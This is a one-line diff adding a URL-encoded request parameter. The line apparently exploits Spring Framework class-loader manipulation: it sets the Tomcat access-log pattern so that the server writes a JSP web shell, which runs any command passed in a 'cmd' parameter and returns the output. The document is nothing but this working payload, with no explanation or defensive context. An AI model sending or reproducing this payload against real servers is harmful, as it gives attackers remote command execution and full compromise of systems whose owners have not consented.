@@ -1,0 +1,1 @@
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+java.io.InputStream+in+%3D+%25%7Bc1%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B+out.println%28new+String%28b%29%29%3B+%7D+%25%7Bsuffix%7Di
